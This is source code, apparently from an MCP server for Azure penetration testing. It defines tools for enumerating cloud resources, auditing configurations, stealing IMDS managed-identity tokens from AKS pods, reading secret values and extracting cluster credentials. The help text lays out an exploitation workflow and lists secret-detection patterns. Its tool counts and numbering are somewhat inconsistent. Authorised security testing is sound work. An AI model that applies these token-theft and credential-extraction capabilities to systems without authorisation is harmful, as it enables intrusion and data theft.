              description: "Optional: Specific principal ID to analyze escalation paths for",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_detect_persistence_mechanisms",
        description: "Identify Azure persistence mechanisms: automation accounts, runbooks, Logic Apps triggers, scheduled tasks, webhook endpoints, custom script extensions",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_scan_aks_full",
        description: "🚀 FULL AKS SECURITY SCAN - Runs ALL 7 AKS security checks in one shot: cluster security, credentials extraction, identity enumeration, node security, IMDS access testing, service account analysis, and secret hunting. Comprehensive Kubernetes security assessment.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group containing the AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_scan_aks_live",
        description: "🔴 LIVE AKS SECURITY SCAN via Kubernetes API - Directly connects to cluster API server and performs real-time security analysis: enumerates secrets, service accounts, RBAC bindings, privileged pods, network policies, exposed services, and more. Requires cluster access.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group containing the AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
            namespace: {
              type: "string",
              description: "Specific namespace to scan (optional, scans all namespaces if not specified)",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_scan_aks_imds",
        description: "IMDS exploitation and full reconnaissance - Complete attack chain: IMDS token theft, permission enumeration, resource discovery, data plane access testing. Tests Pod-to-IMDS-to-Azure attack path. Enumerates accessible subscriptions, resource groups, resources, role assignments, and tests data plane access (Storage, Key Vault, ACR). Supports token export for offline exploitation and cluster-wide IMDS exposure scanning.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group containing the AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
            namespace: {
              type: "string",
              description: "Target namespace to test IMDS from (default: uses first available pod)",
            },
            podName: {
              type: "string",
              description: "Specific pod to execute from (optional, auto-selects if not specified)",
            },
            deepScan: {
              type: "boolean",
              description: "Enable deep resource enumeration (slower but comprehensive). Default: true",
            },
            testDataPlane: {
              type: "boolean",
              description: "Test actual data plane access (Storage blobs, Key Vault secrets, ACR repos). Default: true",
            },
            exportTokens: {
              type: "boolean",
              description: "Export stolen tokens to temp file with curl command examples for offline exploitation. Default: false",
            },
            deepDataPlane: {
              type: "boolean",
              description: "Actually READ secret values, DOWNLOAD blob contents (not just enumerate). CAUTION: May expose sensitive data. Default: false",
            },
            scanAllPods: {
              type: "boolean",
              description: "Scan ALL pods cluster-wide for IMDS exposure (creates exposure heatmap). Slower but comprehensive assessment. Default: false",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
    ],
  };
});

// Completion handler - provides intelligent auto-suggestions
server.setRequestHandler(CompleteRequestSchema, async (request) => {
  const { ref, argument } = request.params;
  
  // Subscription ID completions (don't suggest actual IDs for security)
  if (argument.name === "subscriptionId") {
    return {
      completion: {
        values: ["<your-subscription-id>"],
        total: 1,
        hasMore: false
      }
    };
  }
  
  // Location completions
  if (argument.name === "location" || argument.name === "locations") {
    const partial = argument.value.toLowerCase();
    const suggestions = [
      ...COMMON_LOCATIONS.filter(l => l.startsWith(partial)),
      ...["all", "common"].filter(s => s.startsWith(partial))
    ];
    
    return {
      completion: {
        values: suggestions.slice(0, 20), // Limit to 20
        total: suggestions.length,
        hasMore: suggestions.length > 20
      }
    };
  }
  
  // Resource type completions
  if (argument.name === "resourceType") {
    const partial = argument.value.toLowerCase();
    const types = ["vms", "storage", "nsgs", "aks", "sql", "keyvaults", "public_ips", "all"];
    const suggestions = types.filter(t => t.startsWith(partial));
    
    return {
      completion: {
        values: suggestions,
        total: suggestions.length,
        hasMore: false
      }
    };
  }
  
  // Format completions
  if (argument.name === "format") {
    const partial = argument.value.toLowerCase();
    const formats = ["markdown", "json", "html", "pdf", "csv"];
    const suggestions = formats.filter(f => f.startsWith(partial));
    
    return {
      completion: {
        values: suggestions,
        total: suggestions.length,
        hasMore: false
      }
    };
  }
  
  // Scan mode completions
  if (argument.name === "scanMode") {
    const partial = argument.value.toLowerCase();
    const modes = ["common", "all"];
    const suggestions = modes.filter(m => m.startsWith(partial));
    
    return {
      completion: {
        values: suggestions,
        total: suggestions.length,
        hasMore: false
      }
    };
  }
  
  // Start from completions (for attack path analysis)
  if (argument.name === "startFrom") {
    const partial = argument.value.toLowerCase();
    const options = ["public-ips", "storage", "vms", "identities", "all"];
    const suggestions = options.filter(o => o.startsWith(partial));
    
    return {
      completion: {
        values: suggestions,
        total: suggestions.length,
        hasMore: false
      }
    };
  }
  
  // No suggestions for this argument
  return {
    completion: {
      values: [],
      total: 0,
      hasMore: false
    }
  };
});

// Handle tool execution
server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;
  
  // Start performance tracking
  const trackingId = performanceTracker.start(name);
  
  logger.info(`Tool invoked: ${name}`, { args }, name);
  
  try {
    switch (name) {
      case "azure_help": {
        performanceTracker.end(trackingId, true);
        logger.info(`Tool completed successfully: ${name}`, {}, name);
        const helpText = `# Stratos - Azure Security Assessment MCP Server

## Overview
This MCP server provides 35 comprehensive tools for Azure security assessment and penetration testing. All tools use your current Azure CLI credentials (az login).

**Version:** 1.9.0
**Total Tools:** 35
**Latest Features:** Multi-location scanning, location filtering, Azure DevOps security scanning, PDF/HTML/CSV report export

## Quick Start Examples

\`\`\`bash
# 1. Discover active Azure locations
list_active_locations subscriptionId="YOUR_SUB" scanMode="common"

# 2. Scan all locations for VMs
scan_all_locations subscriptionId="YOUR_SUB" resourceType="vms" locations="all"

# 3. Generate PDF security report
generate_security_report subscriptionId="YOUR_SUB" format="pdf" outputFile="C:\\\\report.pdf"

# 4. Filter resources by location
enumerate_resources subscriptionId="YOUR_SUB" location="eastus,westeurope"
\`\`\`

---

## Available Tools (35)

### MULTI-LOCATION TOOLS (NEW!)

### 1. list_active_locations
**Description:** Discover which Azure locations have resources deployed
**Use Cases:**
  - Quick reconnaissance to find active regions
  - Identify where to focus deeper scans
  - Map geographical footprint
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - scanMode (optional): 'common' (10 locations) or 'all' (45+ locations)
**Example:**
  subscriptionId: "YOUR_SUB"
  scanMode: "all"

### 2. scan_all_locations
**Description:** Scan multiple Azure locations for specific resource types
**Use Cases:**
  - Enumerate all VMs across regions
  - Find storage accounts globally
  - Discover AKS clusters in all locations
**Resource Types:** vms, storage, nsgs, aks, sql, keyvaults, public_ips, all
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceType (required): Type of resource to scan
  - locations (optional): 'common', 'all', or comma-separated list
**Example:**
  subscriptionId: "YOUR_SUB"
  resourceType: "storage"
  locations: "all"

---

### ENUMERATION TOOLS (3-11)

### 3. help
**Description:** Display this comprehensive help information
**Usage:** Call this tool anytime to see available features and examples
**Parameters:** None

### 4. enumerate_subscriptions
**Description:** List all Azure subscriptions you have access to
**Use Cases:** 
  - Discover available target environments
  - Identify subscription IDs for further enumeration
  - Verify authentication and access scope
**Parameters:** None
**Example Output:** Subscription ID, name, state, tenant ID
**Best Practice:** Start here to identify which subscriptions to assess

### 5. enumerate_resource_groups
**Description:** List all resource groups within a subscription
**Use Cases:**
  - Map organizational structure
  - Identify resource groupings for targeted assessment
  - Discover naming conventions and patterns
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - location (optional): Filter by location(s) - single, comma-separated, 'common', or 'all'
  - subscriptionId (required): Azure subscription ID
**Example:** 
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 4. enumerate_resources
**Description:** Enumerate all resources in a subscription or resource group
**Use Cases:**
  - Comprehensive asset inventory
  - Identify exposed services (VMs, storage, databases)
  - Find misconfigured resources
  - Discover resource types and counts
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by specific resource group
  - resourceType (optional): Filter by type (e.g., Microsoft.Storage/storageAccounts)
**Common Resource Types:**
  - Microsoft.Compute/virtualMachines (VMs)
  - Microsoft.Storage/storageAccounts (Storage)
  - Microsoft.Network/networkSecurityGroups (NSGs/Firewalls)
  - Microsoft.Network/publicIPAddresses (Public IPs)
  - Microsoft.Sql/servers (SQL Servers)
  - Microsoft.KeyVault/vaults (Key Vaults)
  - Microsoft.Network/virtualNetworks (VNets)
  - Microsoft.ContainerService/managedClusters (AKS/Kubernetes)
**Example 1 - All resources:** 
  subscriptionId: "00000000-0000-0000-0000-000000000000"
**Example 2 - Only storage accounts:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  resourceType: "Microsoft.Storage/storageAccounts"

### 5. get_resource_details
**Description:** Get detailed configuration of a specific resource
**Use Cases:**
  - Analyze security configurations
  - Check encryption settings
  - Review network configurations
  - Identify misconfigurations
  - Extract sensitive information
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group name
  - resourceProvider (required): Provider (e.g., Microsoft.Storage)
  - resourceType (required): Type (e.g., storageAccounts)
  - resourceName (required): Resource name
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  resourceGroup: "my-resource-group"
  resourceProvider: "Microsoft.Storage"
  resourceType: "storageAccounts"
  resourceName: "mystorageaccount"

### 6. analyze_storage_security (NEW - Phase 1)
**Description:** Automated security analysis of all storage accounts
**Use Cases:**
  - Identify publicly accessible storage (anonymous blob access)
  - Find unencrypted storage accounts
  - Check for HTTP-only access (missing HTTPS enforcement)
  - Verify firewall/network rules
  - Detect weak TLS versions (< 1.2)
  - Validate private endpoint usage
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Security Checks:**
  - CRITICAL: HTTPS-only disabled, missing encryption
  - HIGH: Public blob access enabled, weak TLS version
  - MEDIUM: No firewall rules, missing private endpoints
  - LOW: Shared key access enabled
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
**Output:** Risk-scored findings with CWE references and remediation steps

### 7. analyze_nsg_rules (NEW - Phase 1)
**Description:** Automated Network Security Group security analysis
**Use Cases:**
  - Identify internet-exposed management ports (RDP, SSH, WinRM)
  - Find open database ports (SQL, MySQL, PostgreSQL, MongoDB)
  - Detect wildcard rules (0.0.0.0/0, *, Internet, Any)
  - Locate overly permissive high-priority rules
  - Map attack surface and entry points
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
  - nsgName (optional): Analyze specific NSG
**High-Risk Detections:**
  - CRITICAL: Management ports (22, 3389, 5985) + wildcard source
  - CRITICAL: All ports (*) exposed to Internet
  - HIGH: Database ports + wildcard source
  - MEDIUM: High-priority Internet-facing rules
**Example 1 - All NSGs:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
**Example 2 - Specific NSG:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  resourceGroup: "my-resource-group"
  nsgName: "my-nsg"
**Output:** Risk-scored findings with attack vectors and remediation

### 8. enumerate_public_ips (NEW - Phase 1)
**Description:** Map all public IP addresses (internet-exposed attack surface)
**Use Cases:**
  - Discover all internet-facing resources
  - Identify external entry points for penetration testing
  - Find orphaned/unattached public IPs (cost + security risk)
  - Map DNS names to IP addresses
  - Locate resources by public IP allocation
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Returns:**
  - IP address and DNS name
  - Allocation method (Static/Dynamic)
  - Attached resource (VM, Load Balancer, App Gateway, etc.)
  - Resource group and location
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
**Attack Surface Info:** Allocated vs unallocated, DNS-enabled, attached resources

### 9. enumerate_rbac_assignments (NEW - Phase 1)
**Description:** List all role assignments (who has access to what)
**Use Cases:**
  - Identify privileged accounts (Owner, Contributor, User Access Admin)
  - Find service principals with excessive permissions
  - Discover potential privilege escalation paths
  - Audit access control configuration
  - Locate shared admin accounts
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - scope (optional): Specific scope (e.g., /subscriptions/{id}/resourceGroups/{rg})
**Returns:**
  - Principal type (User/ServicePrincipal/Group)
  - Role name and type (Owner/Contributor/Reader/Custom)
  - Scope level (Subscription/ResourceGroup/Resource)
  - Creation date and creator
**Example 1 - Subscription-wide:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
**Example 2 - Resource group:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  scope: "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/my-resource-group"
**Security Focus:** Privileged roles, service principals, group memberships

### SECURITY SCANNING TOOLS (10-19)

### 10. scan_sql_databases
**Description:** Comprehensive SQL Database security scanner
**Use Cases:**
  - Check TDE encryption status
  - Audit firewall rules (detect 0.0.0.0-255.255.255.255 allow-all)
  - Verify Azure AD authentication vs SQL auth
  - Check auditing and threat detection status
  - Identify public endpoint exposure
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Security Checks:**
  - CRITICAL: Allow-all firewall, TDE encryption disabled
  - HIGH: Public endpoint + SQL auth, auditing disabled
  - MEDIUM: Threat detection disabled
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 11. check_key_vault_security
**Description:** Key Vault security assessment
**Use Cases:**
  - Check soft delete and purge protection
  - Verify public network access restrictions
  - Audit RBAC vs Access Policies
  - Check secret/certificate expiration
  - Validate diagnostic logging
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Security Checks:**
  - CRITICAL: Soft delete disabled, purge protection disabled
  - HIGH: Public network access enabled, expired secrets
  - MEDIUM: Diagnostic logging disabled
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 12. analyze_vm_security
**Description:** Virtual Machine security scanner
**Use Cases:**
  - Check OS/data disk encryption
  - Verify security extensions (Defender, Azure Monitor Agent)
  - Check boot diagnostics storage access
  - Audit patch management status
  - Validate Just-in-Time VM access
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 13. analyze_cosmosdb_security
**Description:** Cosmos DB security analyzer
**Use Cases:**
  - Check public network access
  - Audit firewall rules (IP restrictions)
  - Verify encryption at rest
  - Check automatic failover configuration
  - Validate backup retention policy
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 14. check_container_registries
**Description:** Azure Container Registry (ACR) security scanner
**Use Cases:**
  - Check admin user enabled (high risk)
  - Verify public network access
  - Check vulnerability scanning (Defender for Containers)
  - Audit content trust (image signing)
  - Check network rules and anonymous pull access
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 15. enumerate_managed_identities
**Description:** Enumerate all managed identities (system-assigned and user-assigned)
**Use Cases:**
  - Map passwordless authentication patterns
  - Identify identity role assignments
  - Find cross-subscription permissions
  - Discover privilege escalation paths
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Returns:**
  - Identity type, associated resources, role assignments, scope of access
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 16. enumerate_service_principals
**Description:** Enumerate all service principals (application identities)
**Use Cases:**
  - Identify over-privileged applications
  - Check credential expiration dates
  - Audit application permissions (Microsoft Graph API)
  - Find orphaned/unused SPNs
**Parameters:**
  - subscriptionId (required): Used for authentication context
**Returns:**
  - Service principal names, application IDs, credential expiration, permissions
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 17. scan_storage_containers
**Description:** Deep scan of storage containers and blobs
**Use Cases:**
  - List all containers and check public access
  - Enumerate blobs and detect sensitive files
  - Find backups, configs, keys (*.bak, web.config, *.pem, *.key, *.sql)
  - Identify SAS tokens and orphaned blobs
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
  - storageAccountName (optional): Scan specific storage account
  - maxBlobsPerContainer (optional): Limit per container (default: 100)
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 18. generate_security_report
**Description:** Generate comprehensive security assessment report (NEW: PDF/HTML/CSV export)
**Use Cases:**
  - Executive summary with risk statistics
  - Professional deliverable reports
  - Compliance framework mapping (CIS/NIST)
  - Export for Excel/data analysis
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
  - format (optional): "markdown", "json", "html", "pdf", "csv" (default: markdown)
  - outputFile (optional): Save to file (e.g., C:\\\\reports\\\\security.pdf)
  - fullScan (optional): Run all 25 tools (future feature)
  - includeRemediation (optional): Include fix guidance (default: true)
  - includeCompliance (optional): Include CIS/NIST mapping (default: true)
**Example - PDF Report:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  format: "pdf"
  outputFile: "C:\\\\reports\\\\azure-security-2025-12-07.pdf"
**Example - HTML Dashboard:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  format: "html"
  outputFile: "C:\\\\reports\\\\dashboard.html"
**Example - CSV for Excel:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  format: "csv"
  outputFile: "C:\\\\reports\\\\findings.csv"

### 19. analyze_attack_paths
**Description:** Map attack paths from public exposure to sensitive resources
**Use Cases:**
  - Identify privilege escalation chains (RBAC → resources)
  - Find lateral movement opportunities (VM → managed identity → secrets)
  - Trace exposed credentials to resource access
  - Map public IP → NSG → VM → identity → data flows
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
  - startFrom (optional): "public-ips", "storage", "vms", "identities", "all"
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  startFrom: "public-ips"

### KUBERNETES/AKS TOOLS (20-24)

### 20. scan_aks_clusters
**Description:** Azure Kubernetes Service (AKS) security assessment
**Use Cases:**
  - Check RBAC enabled
  - Verify network policies configured
  - Audit pod security policies
  - Check private cluster mode
  - Validate Azure Policy integration
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"

### 21. get_aks_credentials
**Description:** Extract AKS cluster credentials and kubeconfig
**Use Cases:**
  - Obtain cluster access for kubectl
  - Get admin credentials (if available)
  - Extract service principal details
  - Retrieve managed identity info
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group containing AKS cluster
  - clusterName (required): AKS cluster name
  - adminAccess (optional): Get admin credentials (default: false)
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  resourceGroup: "my-resource-group"
  clusterName: "my-aks-cluster"

### 22. enumerate_aks_identities
**Description:** Enumerate AKS cluster identities and service principals
**Use Cases:**
  - Identify cluster managed identity
  - Find kubelet identity
  - Map identity role assignments
  - Check Key Vault and storage access
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group containing AKS cluster
  - clusterName (required): AKS cluster name
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  resourceGroup: "my-resource-group"
  clusterName: "my-aks-cluster"

### 23. scan_aks_node_security
**Description:** Scan AKS node (VM) security configuration
**Use Cases:**
  - Check OS disk encryption
  - Verify SSH access enabled
  - Check public IPs on nodes
  - Audit node pool configuration
  - Check auto-upgrade and security patches
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group containing AKS cluster
  - clusterName (required): AKS cluster name
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  resourceGroup: "my-resource-group"
  clusterName: "my-aks-cluster"

### 24. scan_aks_imds
**Description:** IMDS exploitation and full Azure reconnaissance from AKS
**Use Cases:**
  - Test IMDS endpoint 169.254.169.254 accessibility
  - Steal managed identity tokens
  - Enumerate subscriptions, resource groups, resources
  - Test data plane access (ACR, KeyVault, Storage)
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group containing AKS cluster
  - clusterName (required): AKS cluster name
**Example:**
  subscriptionId: "00000000-0000-0000-0000-000000000000"
  resourceGroup: "my-resource-group"
  clusterName: "my-aks-cluster"

### DEVOPS TOOLS (25)

### 25. scan_azure_devops [NEW]
**Description:** Azure DevOps security scanner (Phase 5)
**Use Cases:**
  - Scan repositories for sensitive files (.env, secrets, credentials)
  - Find hardcoded passwords, API keys, connection strings in pipelines
  - Identify insecure service connections
  - Enumerate projects, repos, and pipelines
**Parameters:**
  - organizationUrl (required): Azure DevOps org URL (e.g., https://dev.azure.com/yourorg)
  - personalAccessToken (required): PAT with Code:Read, Build:Read permissions
  - scanRepositories (optional): Scan repos for secrets (default: true)
  - scanPipelines (optional): Scan pipelines for hardcoded creds (default: true)
**Detection Patterns:**
  - CRITICAL: password[:=], connectionString[:=], apiKey[:=]
  - HIGH: secret[:=], token[:=]
**Example:**
  organizationUrl: "https://dev.azure.com/your-organization"
  personalAccessToken: "YOUR_PAT_TOKEN"
  scanRepositories: true
  scanPipelines: true

---

## Professional Penetration Testing Workflow

### Phase 1: Reconnaissance & Asset Discovery
1. \`enumerate_subscriptions\` - Discover target scope and environments
2. \`enumerate_resource_groups\` - Map organizational structure
3. \`enumerate_resources\` - Complete asset inventory
4. \`enumerate_public_ips\` - Identify internet-exposed attack surface
5. \`enumerate_managed_identities\` - Map passwordless auth patterns
6. \`enumerate_service_principals\` - Find application identities

### Phase 2: Access Control Analysis
7. \`enumerate_rbac_assignments\` - Map permissions and identify privileged accounts
8. \`analyze_attack_paths\` - Trace privilege escalation chains
9. Look for: Service principals with Owner/Contributor, shared admin accounts

### Phase 3: Automated Security Assessment
10. \`analyze_storage_security\` - Scan all storage for misconfigurations
11. \`scan_storage_containers\` - Deep scan for sensitive files
12. \`analyze_nsg_rules\` - Identify network exposure and risky firewall rules
13. \`scan_sql_databases\` - Check database security
14. \`check_key_vault_security\` - Audit secrets management
15. \`analyze_vm_security\` - Check compute security
16. \`check_container_registries\` - Audit container security
17. \`analyze_cosmosdb_security\` - Check NoSQL database security

### Phase 4: Kubernetes/AKS Assessment
18. \`scan_aks_clusters\` - Check cluster security configuration
19. \`enumerate_aks_identities\` - Map cluster identities and permissions
20. \`scan_aks_node_security\` - Audit node security
21. \`scan_aks_imds\` - IMDS exploitation & token theft testing
22. \`get_aks_credentials\` - Extract kubeconfig for manual testing

### Phase 5: DevOps Security
23. \`scan_azure_devops\` - Scan repos and pipelines for hardcoded secrets
24. Look for: passwords in YAML, API keys in variables, credentials in repos

### Phase 6: Reporting & Deliverables
25. \`generate_security_report\` - Create comprehensive assessment report
    - PDF format for executive stakeholders
    - HTML format for interactive dashboards
    - CSV format for tracking and remediation
    - Markdown/JSON for documentation and automation

### Phase 7: Exploitation Research
26. Cross-reference findings:
    - Public IP + Open SSH/RDP = Brute force target
    - Storage + Public access = Data exfiltration
    - NSG + Database port = Direct DB access
    - Service Principal + Owner role = Privilege escalation
    - AKS + IMDS accessible = Managed identity token theft
    - DevOps pipeline + hardcoded credentials = Supply chain attack

## Security Considerations

- **Authentication:** Uses DefaultAzureCredential (Azure CLI credentials)
- **Permissions Required:** Reader role or higher on target subscriptions
- **Audit Trail:** All API calls are logged in Azure Activity Logs
- **Scope:** Only enumerates resources you have permission to access
- **Rate Limits:** Azure API has rate limits; space out large enumerations

## Common Security Findings (CWE Mapped)

### Storage Security Issues
- **CWE-284:** Public blob access enabled (anonymous access)
- **CWE-319:** HTTP-only access (cleartext transmission)
- **CWE-327:** Weak TLS version (< TLS 1.2)
- **CWE-311:** Missing blob encryption
- **CWE-923:** No network restrictions (firewall disabled)

### Network Exposure Issues
- **CWE-749:** Management ports exposed (RDP 3389, SSH 22, WinRM 5985)
- **CWE-668:** Database ports exposed (SQL 1433, MySQL 3306, PostgreSQL 5432)
- **CWE-284:** Wildcard rules (0.0.0.0/0, *, Internet, Any)
- **CWE-923:** Missing private endpoints for sensitive services

### Access Control Issues
- **CWE-250:** Service principals with Owner/Contributor roles
- **CWE-266:** Overly broad RBAC assignments at subscription level
- **CWE-798:** Shared key access enabled (hard-coded credential risk)

## Tips

- Start with \`enumerate_subscriptions\` to get subscription IDs
- Use resource type filters to focus on specific service types
- Resource IDs follow format: /subscriptions/{sub}/resourceGroups/{rg}/providers/{provider}/{type}/{name}
- Check tags for environment info (Production, Development, Testing)
- Look for resources in unexpected regions (data residency concerns)

## Error Handling

Common errors and solutions:
- "Authentication failed" → Run \`az login\` in terminal
- "Subscription not found" → Verify subscription ID format
- "Resource not found" → Check resource group and name spelling
- "Insufficient permissions" → Request Reader or Contributor role

## Export Formats (NEW - Phase 5)

### Markdown (Default)
- Human-readable text format
- Best for: GitHub, VS Code, documentation
- Output: Plain text with markdown formatting

### JSON
- Structured data format
- Best for: API integration, automation, parsing
- Output: JSON object with findings array

### HTML [NEW]
- Interactive dashboard with styling
- Best for: Browser viewing, team sharing, stakeholders
- Features: Color-coded severity, sortable table, hover effects
- Output: Full HTML5 document with embedded CSS

### PDF [NEW]
- Professional deliverable report
- Best for: Executive presentations, client reports, compliance
- Features: Title page, metadata, executive summary, findings by category
- Output: PDF file (requires outputFile parameter)

### CSV [NEW]
- Excel-ready data export
- Best for: Data analysis, pivot tables, tracking remediation
- Features: Severity, Category, Resource, Finding columns
- Output: CSV file or text

**Export Examples:**
\`\`\`bash
# PDF report for management
generate_security_report subscriptionId="SUB" format="pdf" outputFile="C:\\\\report.pdf"

# HTML dashboard for team
generate_security_report subscriptionId="SUB" format="html" outputFile="C:\\\\dashboard.html"

# CSV for Excel analysis
generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\findings.csv"
\`\`\`

---

## Version: 1.9.0 (Multi-Location Scanning)
## Total Tools: 35
## Last Updated: January 2025

**Recent Updates:**
- [NEW] Multi-location scanning (list_active_locations, scan_all_locations)
- [NEW] Location filtering for enumerate_resource_groups, enumerate_resources
- [OK] Azure DevOps security scanning (scan_azure_devops)
- [OK] PDF/HTML/CSV report export formats
- [OK] Deep storage container scanning
- [OK] AKS offensive security tools (4 tools)
- [OK] Attack path analysis
- [OK] Managed identity enumeration

**Supported Locations:**
- Common (10): eastus, eastus2, westus2, westeurope, northeurope, southeastasia, australiaeast, uksouth, centralindia, japaneast
- All (45+): Full global coverage including Americas, Europe, Asia Pacific, Middle East, Africa

**Dependencies:**
- 201 npm packages installed
- 0 vulnerabilities detected
- Azure SDK v4+ for all services
- Azure DevOps API v13.2.0
- PDFKit, Marked, CSV-Writer for export formats
`;

        return {
          content: [
            {
              type: "text",
              text: helpText,
            },
          ],
        };
      }

      case "azure_enumerate_subscriptions": {
        const { format } = request.params.arguments as {
          format?: string;
        };

        const client = new SubscriptionClient(credential);
        const subscriptions = [];
        
        for await (const sub of client.subscriptions.list()) {
          subscriptions.push({
            id: sub.subscriptionId,
            name: sub.displayName,
            state: sub.state,
            tenantId: sub.tenantId,
          });
        }

        const output = `# Azure Subscriptions\n\nFound ${subscriptions.length} subscription(s):\n\n${JSON.stringify(subscriptions, null, 2)}`;

        return {
          content: [
            {
              type: "text",
              text: formatResponse(output, format, request.params.name),
            },
          ],
        };
      }

      case "azure_list_active_locations": {
        const { subscriptionId, scanMode, format } = request.params.arguments as {
          subscriptionId: string;
          scanMode?: "common" | "all";
          format?: string;
        };

        const locationsToCheck = scanMode === "all" ? AZURE_LOCATIONS : COMMON_LOCATIONS;
        const resourceClient = new ResourceManagementClient(credential, subscriptionId);
        const computeClient = new ComputeManagementClient(credential, subscriptionId);
        const storageClient = new StorageManagementClient(credential, subscriptionId);
        
        const locationSummary: Record<string, { resourceGroups: number; vms: number; storage: number; total: number }> = {};
        
        const allResources: Array<{ location?: string; type?: string }> = [];
        
        for await (const resource of resourceClient.resources.list()) {
          allResources.push({ location: resource.location, type: resource.type });
        }

        const resourceGroups: Array<{ location?: string }> = [];
        for await (const rg of resourceClient.resourceGroups.list()) {
          resourceGroups.push({ location: rg.location });
        }

        // Count by location
        for (const loc of locationsToCheck) {
          const rgCount = resourceGroups.filter(rg => rg.location?.toLowerCase() === loc).length;
